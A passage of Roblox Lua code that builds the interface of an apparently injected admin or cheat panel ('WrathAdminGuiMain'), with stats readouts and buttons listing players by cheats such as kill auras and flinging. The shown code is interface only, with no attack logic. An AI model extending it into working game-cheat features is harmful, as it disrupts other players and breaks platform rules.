    Toggle_4 = Instance.new("TextButton");
    UICorner_17 = Instance.new("UICorner");
    TextLabel_7 = Instance.new("TextLabel");
    Toggle_5 = Instance.new("TextButton");
    UICorner_18 = Instance.new("UICorner");
    TextLabel_8 = Instance.new("TextLabel");
    Toggle_6 = Instance.new("TextButton");
    UICorner_19 = Instance.new("UICorner");
    TextLabel_9 = Instance.new("TextLabel");
    ImmunitySettings = Instance.new("Frame");
    ImmunityTopbar = Instance.new("Frame");
    TemplateTopbarRound_4 = Instance.new("UICorner");
    TogglesTitle_2 = Instance.new("TextLabel");
    PlayerListRound_5 = Instance.new("UICorner");
    ImmunityListFrame = Instance.new("ScrollingFrame");
    UIListLayout_5 = Instance.new("UIListLayout");
    Toggle_7 = Instance.new("TextButton");
    UICorner_20 = Instance.new("UICorner");
    TextLabel_10 = Instance.new("TextLabel");
    Toggle_8 = Instance.new("TextButton");
    UICorner_21 = Instance.new("UICorner");
    TextLabel_11 = Instance.new("TextLabel");
    Toggle_9 = Instance.new("TextButton");
    UICorner_22 = Instance.new("UICorner");
    TextLabel_12 = Instance.new("TextLabel");
    Toggle_10 = Instance.new("TextButton");
    UICorner_23 = Instance.new("UICorner");
    TextLabel_13 = Instance.new("TextLabel");
    Toggle_11 = Instance.new("TextButton");
    UICorner_24 = Instance.new("UICorner");
    TextLabel_14 = Instance.new("TextLabel");
    Toggle_12 = Instance.new("TextButton");
    UICorner_25 = Instance.new("UICorner");
    TextLabel_15 = Instance.new("TextLabel");
    AdminSettings = Instance.new("Frame");
    AdminTopbar = Instance.new("Frame");
    TemplateTopbarRound_5 = Instance.new("UICorner");
    TogglesTitle_3 = Instance.new("TextLabel");
    PlayerListRound_6 = Instance.new("UICorner");
    AdminListFrame = Instance.new("ScrollingFrame");
    UIListLayout_6 = Instance.new("UIListLayout");
    Toggle_13 = Instance.new("TextButton");
    UICorner_26 = Instance.new("UICorner");
    TextLabel_16 = Instance.new("TextLabel");
    Toggle_14 = Instance.new("TextButton");
    UICorner_27 = Instance.new("UICorner");
    TextLabel_17 = Instance.new("TextLabel");
    Toggle_15 = Instance.new("TextButton");
    UICorner_28 = Instance.new("UICorner");
    TextLabel_18 = Instance.new("TextLabel");
    Toggle_16 = Instance.new("TextButton");
    UICorner_29 = Instance.new("UICorner");
    TextLabel_19 = Instance.new("TextLabel");
    Toggle_17 = Instance.new("TextButton");
    UICorner_30 = Instance.new("UICorner");
    TextLabel_20 = Instance.new("TextLabel");
    Commands = Instance.new("Frame");
    CommandsTopbar = Instance.new("Frame");
    TemplateTopbarRound_6 = Instance.new("UICorner");
    TogglesTitle_4 = Instance.new("TextLabel");
    PlayerListRound_7 = Instance.new("UICorner");
    CommandsListFrame = Instance.new("ScrollingFrame");
    UIListLayout_7 = Instance.new("UIListLayout");
    Command = Instance.new("TextButton");
    UICorner_31 = Instance.new("UICorner");
    Output = Instance.new("Frame");
    TemplateTopbar_3 = Instance.new("Frame");
    TemplateTopbarRound_7 = Instance.new("UICorner");
    TemplateTitle_3 = Instance.new("TextLabel");
    PlayerListRound_8 = Instance.new("UICorner");
    OutputListFrame = Instance.new("ScrollingFrame");
    UIListLayout_8 = Instance.new("UIListLayout");
    Log = Instance.new("TextButton");
    UICorner_32 = Instance.new("UICorner");
};

--Properties:

MainGuiObjects.WrathAdminGuiMain.Name = "WrathAdminGuiMain"
MainGuiObjects.WrathAdminGuiMain.Parent = CoreGui
MainGuiObjects.WrathAdminGuiMain.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainGuiObjects.Stats.Name = "Stats"
MainGuiObjects.Stats.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.Stats.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.Stats.BorderSizePixel = 0
MainGuiObjects.Stats.Position = UDim2.new(0.280947268, 81, 0.657276988, -223)
MainGuiObjects.Stats.Size = UDim2.new(0, 242, 0, 164)
makeDraggable(MainGuiObjects.Stats);

MainGuiObjects.TemplateTopbar.Name = "TemplateTopbar"
MainGuiObjects.TemplateTopbar.Parent = MainGuiObjects.Stats
MainGuiObjects.TemplateTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TemplateTopbar.BorderSizePixel = 0
MainGuiObjects.TemplateTopbar.Size = UDim2.new(0, 242, 0, 31)

MainGuiObjects.TemplateTopbarRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound.Parent = MainGuiObjects.TemplateTopbar

MainGuiObjects.TemplateTitle.Name = "TemplateTitle"
MainGuiObjects.TemplateTitle.Parent = MainGuiObjects.TemplateTopbar
MainGuiObjects.TemplateTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle.BackgroundTransparency = 1.000
MainGuiObjects.TemplateTitle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TemplateTitle.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TemplateTitle.Font = Enum.Font.Code
MainGuiObjects.TemplateTitle.Text = "Stats"
MainGuiObjects.TemplateTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle.TextSize = 31.000

MainGuiObjects.PlayerListRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound.Parent = MainGuiObjects.Stats

MainGuiObjects.StatesListFrame.Name = "StatesListFrame"
MainGuiObjects.StatesListFrame.Parent = MainGuiObjects.Stats
MainGuiObjects.StatesListFrame.Active = true
MainGuiObjects.StatesListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.StatesListFrame.BorderSizePixel = 0
MainGuiObjects.StatesListFrame.Position = UDim2.new(0.02892562, 0, 0.248236686, 0)
MainGuiObjects.StatesListFrame.Size = UDim2.new(0, 225, 0, 114)
MainGuiObjects.StatesListFrame.ScrollBarThickness = 1

MainGuiObjects.UIListLayout.Parent = MainGuiObjects.StatesListFrame
MainGuiObjects.UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
MainGuiObjects.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout.Padding = UDim.new(0, 5)

MainGuiObjects.Stat.Name = "Stat"
MainGuiObjects.Stat.Parent = MainGuiObjects.StatesListFrame
MainGuiObjects.Stat.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Stat.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Stat.BorderSizePixel = 0
MainGuiObjects.Stat.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Stat.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Stat.Font = Enum.Font.Code
MainGuiObjects.Stat.Text = " Ping"
MainGuiObjects.Stat.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Stat.TextSize = 14.000
MainGuiObjects.Stat.TextXAlignment = Enum.TextXAlignment.Left

MainGuiObjects.UICorner.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner.Parent = MainGuiObjects.Stat

MainGuiObjects.TextLabel.Parent = MainGuiObjects.Stat
MainGuiObjects.TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel.Font = Enum.Font.Code
MainGuiObjects.TextLabel.Text = "100"
MainGuiObjects.TextLabel.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel.TextSize = 14.000
MainGuiObjects.TextLabel.TextXAlignment = Enum.TextXAlignment.Right

MainGuiObjects.Stat_2.Name = "Stat"
MainGuiObjects.Stat_2.Parent = MainGuiObjects.StatesListFrame
MainGuiObjects.Stat_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Stat_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Stat_2.BorderSizePixel = 0
MainGuiObjects.Stat_2.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Stat_2.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Stat_2.Font = Enum.Font.Code
MainGuiObjects.Stat_2.Text = " FPS"
MainGuiObjects.Stat_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Stat_2.TextSize = 14.000
MainGuiObjects.Stat_2.TextXAlignment = Enum.TextXAlignment.Left

MainGuiObjects.UICorner_2.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_2.Parent = MainGuiObjects.Stat_2

MainGuiObjects.TextLabel_2.Parent = MainGuiObjects.Stat_2
MainGuiObjects.TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_2.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_2.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_2.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_2.Font = Enum.Font.Code
MainGuiObjects.TextLabel_2.Text = ""
MainGuiObjects.TextLabel_2.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_2.TextSize = 14.000
MainGuiObjects.TextLabel_2.TextXAlignment = Enum.TextXAlignment.Right

------------ MEASURE PING + FPS --------------
task.spawn(function()
    while task.wait(0.03) do
        local Ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString() or "nil";
        local FPS = math.floor(1/rService.RenderStepped:wait());
        MainGuiObjects.TextLabel.Text = "  " .. Ping:split(" ")[1];
        MainGuiObjects.TextLabel_2.Text = "  " .. FPS;
    end;
end);

MainGuiObjects.Stat_3.Name = "Stat"
MainGuiObjects.Stat_3.Parent = MainGuiObjects.StatesListFrame
MainGuiObjects.Stat_3.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Stat_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Stat_3.BorderSizePixel = 0
MainGuiObjects.Stat_3.Position = UDim2.new(-0.00444444455, 0, 0.00902553741, 0)
MainGuiObjects.Stat_3.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Stat_3.Font = Enum.Font.Code
MainGuiObjects.Stat_3.Text = " Run Time"
MainGuiObjects.Stat_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Stat_3.TextSize = 14.000
MainGuiObjects.Stat_3.TextXAlignment = Enum.TextXAlignment.Left

MainGuiObjects.UICorner_3.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_3.Parent = MainGuiObjects.Stat_3

MainGuiObjects.TextLabel_3.Parent = MainGuiObjects.Stat_3
MainGuiObjects.TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_3.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_3.Position = UDim2.new(0.715555549, 0, 0, 0)
MainGuiObjects.TextLabel_3.Size = UDim2.new(0, 64, 0, 25)
MainGuiObjects.TextLabel_3.Font = Enum.Font.Code
MainGuiObjects.TextLabel_3.Text = "0:00:00"
MainGuiObjects.TextLabel_3.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_3.TextSize = 14.000
MainGuiObjects.TextLabel_3.TextXAlignment = Enum.TextXAlignment.Right

--------- RUN TIME --------
task.spawn(function()
    while task.wait(0.03) do
        MainGuiObjects.TextLabel_3.Text = tostring(math.floor(tick() - ExecutionTime));
    end;
end);

MainGuiObjects.GetPlayers.Name = "GetPlayers"
MainGuiObjects.GetPlayers.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.GetPlayers.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.GetPlayers.BorderSizePixel = 0
MainGuiObjects.GetPlayers.Position = UDim2.new(0.0118407542, 744, 0.017214397, 334)
MainGuiObjects.GetPlayers.Size = UDim2.new(0, 242, 0, 361)
makeDraggable(MainGuiObjects.GetPlayers);

MainGuiObjects.TemplateTopbar_2.Name = "TemplateTopbar"
MainGuiObjects.TemplateTopbar_2.Parent = MainGuiObjects.GetPlayers
MainGuiObjects.TemplateTopbar_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TemplateTopbar_2.BorderSizePixel = 0
MainGuiObjects.TemplateTopbar_2.Size = UDim2.new(0, 242, 0, 31)

MainGuiObjects.TemplateTopbarRound_2.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_2.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_2.Parent = MainGuiObjects.TemplateTopbar_2

MainGuiObjects.TemplateTitle_2.Name = "TemplateTitle"
MainGuiObjects.TemplateTitle_2.Parent = MainGuiObjects.TemplateTopbar_2
MainGuiObjects.TemplateTitle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle_2.BackgroundTransparency = 1.000
MainGuiObjects.TemplateTitle_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TemplateTitle_2.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TemplateTitle_2.Font = Enum.Font.Code
MainGuiObjects.TemplateTitle_2.Text = "Get Players"
MainGuiObjects.TemplateTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle_2.TextSize = 31.000

MainGuiObjects.PlayerListRound_2.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_2.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_2.Parent = MainGuiObjects.GetPlayers

MainGuiObjects.GetPlayersContent.Name = "StatesListFrame"
MainGuiObjects.GetPlayersContent.Parent = MainGuiObjects.GetPlayers
MainGuiObjects.GetPlayersContent.Active = true
MainGuiObjects.GetPlayersContent.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.GetPlayersContent.BorderSizePixel = 0
MainGuiObjects.GetPlayersContent.Position = UDim2.new(0.0495867766, 0, 0.112239599, 0)
MainGuiObjects.GetPlayersContent.Size = UDim2.new(0, 218, 0, 286)
MainGuiObjects.GetPlayersContent.ScrollBarThickness = 1

MainGuiObjects.TextButton.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton.BorderSizePixel = 0
MainGuiObjects.TextButton.Position = UDim2.new(0.0495867766, 0, 0.132604286, 0)
MainGuiObjects.TextButton.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton.Font = Enum.Font.Code
MainGuiObjects.TextButton.Text = "Armor Spammers"
MainGuiObjects.TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton.TextSize = 14.000

MainGuiObjects.UICorner_4.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_4.Parent = MainGuiObjects.TextButton

MainGuiObjects.TextButton_2.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_2.BorderSizePixel = 0
MainGuiObjects.TextButton_2.Position = UDim2.new(0.0495867766, 0, 0.207450449, 0)
MainGuiObjects.TextButton_2.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_2.Font = Enum.Font.Code
MainGuiObjects.TextButton_2.Text = "Admins"
MainGuiObjects.TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_2.TextSize = 14.000

MainGuiObjects.UICorner_5.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_5.Parent = MainGuiObjects.TextButton_2

MainGuiObjects.TextButton_3.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_3.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_3.BorderSizePixel = 0
MainGuiObjects.TextButton_3.Position = UDim2.new(0.0495867766, 0, 0.287764877, 0)
MainGuiObjects.TextButton_3.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_3.Font = Enum.Font.Code
MainGuiObjects.TextButton_3.Text = "Invisible"
MainGuiObjects.TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_3.TextSize = 14.000

MainGuiObjects.UICorner_6.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_6.Parent = MainGuiObjects.TextButton_3

MainGuiObjects.TextButton_4.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_4.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_4.BorderSizePixel = 0
MainGuiObjects.TextButton_4.Position = UDim2.new(0.0495867766, 0, 0.366712272, 0)
MainGuiObjects.TextButton_4.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_4.Font = Enum.Font.Code
MainGuiObjects.TextButton_4.Text = "Kill Auras"
MainGuiObjects.TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_4.TextSize = 14.000

MainGuiObjects.UICorner_7.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_7.Parent = MainGuiObjects.TextButton_4

MainGuiObjects.TextButton_5.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_5.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_5.BorderSizePixel = 0
MainGuiObjects.TextButton_5.Position = UDim2.new(0.0495867766, 0, 0.450444341, 0)
MainGuiObjects.TextButton_5.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_5.Font = Enum.Font.Code
MainGuiObjects.TextButton_5.Text = "Tase Auras"
MainGuiObjects.TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_5.TextSize = 14.000

MainGuiObjects.UICorner_8.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_8.Parent = MainGuiObjects.TextButton_5

MainGuiObjects.TextButton_6.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_6.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_6.BorderSizePixel = 0
MainGuiObjects.TextButton_6.Position = UDim2.new(0.0495867766, 0, 0.627477825, 0)
MainGuiObjects.TextButton_6.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_6.Font = Enum.Font.Code
MainGuiObjects.TextButton_6.Text = "Loop Killing"
MainGuiObjects.TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_6.TextSize = 14.000

MainGuiObjects.UICorner_9.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_9.Parent = MainGuiObjects.TextButton_6

MainGuiObjects.TextButton_7.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_7.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_7.BorderSizePixel = 0
MainGuiObjects.TextButton_7.Position = UDim2.new(0.0495867766, 0, 0.739917994, 0)
MainGuiObjects.TextButton_7.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_7.Font = Enum.Font.Code
MainGuiObjects.TextButton_7.Text = "Loop Tasing"
MainGuiObjects.TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_7.TextSize = 14.000

MainGuiObjects.UICorner_10.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_10.Parent = MainGuiObjects.TextButton_7

MainGuiObjects.TextButton_8.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_8.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_8.BorderSizePixel = 0
MainGuiObjects.TextButton_8.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.TextButton_8.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_8.Font = Enum.Font.Code
MainGuiObjects.TextButton_8.Text = "Infected"
MainGuiObjects.TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_8.TextSize = 14.000

MainGuiObjects.UICorner_11.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_11.Parent = MainGuiObjects.TextButton_8

MainGuiObjects.UIListLayout_2.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_2.Padding = UDim.new(0, 5)

MainGuiObjects.TextButton_9.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_9.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_9.BorderSizePixel = 0
MainGuiObjects.TextButton_9.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.TextButton_9.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_9.Font = Enum.Font.Code
MainGuiObjects.TextButton_9.Text = "Protected"
MainGuiObjects.TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_9.TextSize = 14.000

--last minute psuedo code :(
MainGuiObjects.GetFlingers = Instance.new("TextButton")
MainGuiObjects.GetFlingers.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetFlingers.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetFlingers.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetFlingers.BorderSizePixel = 0
MainGuiObjects.GetFlingers.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetFlingers.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetFlingers.Font = Enum.Font.Code
MainGuiObjects.GetFlingers.Text = "Invisible Flingers"
MainGuiObjects.GetFlingers.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetFlingers.TextSize = 14.000

MainGuiObjects.GFRound = Instance.new("UICorner");
MainGuiObjects.GFRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.GFRound.Parent = MainGuiObjects.GetFlingers;

MainGuiObjects.GetAntiShoots = Instance.new("TextButton")
MainGuiObjects.GetAntiShoots.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetAntiShoots.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetAntiShoots.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetAntiShoots.BorderSizePixel = 0
MainGuiObjects.GetAntiShoots.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetAntiShoots.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetAntiShoots.Font = Enum.Font.Code
MainGuiObjects.GetAntiShoots.Text = "Shoot Back"
MainGuiObjects.GetAntiShoots.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetAntiShoots.TextSize = 14.000

MainGuiObjects.GSRound = Instance.new("UICorner");
MainGuiObjects.GSRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.GSRound.Parent = MainGuiObjects.GetAntiShoots;

MainGuiObjects.GetTaseBack = Instance.new("TextButton")
MainGuiObjects.GetTaseBack.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetTaseBack.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetTaseBack.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetTaseBack.BorderSizePixel = 0
MainGuiObjects.GetTaseBack.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetTaseBack.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetTaseBack.Font = Enum.Font.Code
MainGuiObjects.GetTaseBack.Text = "Tase Back"
MainGuiObjects.GetTaseBack.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetTaseBack.TextSize = 14.000

MainGuiObjects.TBRound = Instance.new("UICorner");
MainGuiObjects.TBRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.TBRound.Parent = MainGuiObjects.GetTaseBack;

MainGuiObjects.GetClickTeleports = Instance.new("TextButton")
MainGuiObjects.GetClickTeleports.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetClickTeleports.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetClickTeleports.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetClickTeleports.BorderSizePixel = 0
MainGuiObjects.GetClickTeleports.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetClickTeleports.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetClickTeleports.Font = Enum.Font.Code
MainGuiObjects.GetClickTeleports.Text = "Click Teleport"
MainGuiObjects.GetClickTeleports.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetClickTeleports.TextSize = 14.000

MainGuiObjects.GCTPRound = Instance.new("UICorner");
MainGuiObjects.GCTPRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.GCTPRound.Parent = MainGuiObjects.GetClickTeleports;

MainGuiObjects.GetOnePunchers = Instance.new("TextButton")
MainGuiObjects.GetOnePunchers.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetOnePunchers.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetOnePunchers.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetOnePunchers.BorderSizePixel = 0
MainGuiObjects.GetOnePunchers.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetOnePunchers.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetOnePunchers.Font = Enum.Font.Code
MainGuiObjects.GetOnePunchers.Text = "One Punch"
MainGuiObjects.GetOnePunchers.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetOnePunchers.TextSize = 14.000

MainGuiObjects.GOPRound = Instance.new("UICorner");
MainGuiObjects.GOPRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.GOPRound.Parent = MainGuiObjects.GetOnePunchers;

MainGuiObjects.UICorner_12.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_12.Parent = MainGuiObjects.TextButton_9

MainGuiObjects.PlayerList.Name = "PlayerList"
MainGuiObjects.PlayerList.Parent = MainGuiObjects.GetPlayers
MainGuiObjects.PlayerList.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.PlayerList.BorderSizePixel = 0
MainGuiObjects.PlayerList.ClipsDescendants = true
MainGuiObjects.PlayerList.Position = UDim2.new(1.03321803, 0, -0.00102038682, 0)
MainGuiObjects.PlayerList.Size = UDim2.new(0, 186, 0, 195)
MainGuiObjects.PlayerList.Visible = false;

MainGuiObjects.ListTopbar.Name = "ListTopbar"
MainGuiObjects.ListTopbar.Parent = MainGuiObjects.PlayerList
MainGuiObjects.ListTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.ListTopbar.BorderSizePixel = 0
MainGuiObjects.ListTopbar.Size = UDim2.new(0, 186, 0, 31)

MainGuiObjects.ListTopbarRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.ListTopbarRound.Name = "ListTopbarRound"
MainGuiObjects.ListTopbarRound.Parent = MainGuiObjects.ListTopbar

MainGuiObjects.ListTitle.Name = "ListTitle"
MainGuiObjects.ListTitle.Parent = MainGuiObjects.ListTopbar
MainGuiObjects.ListTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.ListTitle.BackgroundTransparency = 1.000
MainGuiObjects.ListTitle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.ListTitle.Size = UDim2.new(0, 186, 0, 31)
MainGuiObjects.ListTitle.Font = Enum.Font.Code
MainGuiObjects.ListTitle.Text = ""
MainGuiObjects.ListTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.ListTitle.TextSize = 23.000

MainGuiObjects.PlayerListFrame.Name = "PlayerListFrame"
MainGuiObjects.PlayerListFrame.Parent = MainGuiObjects.ListTopbar
MainGuiObjects.PlayerListFrame.Active = true
MainGuiObjects.PlayerListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.PlayerListFrame.BorderSizePixel = 0
MainGuiObjects.PlayerListFrame.Position = UDim2.new(0.049586799, 0, 1.20932424, 0)
MainGuiObjects.PlayerListFrame.Size = UDim2.new(0, 167, 0, 145)
MainGuiObjects.PlayerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
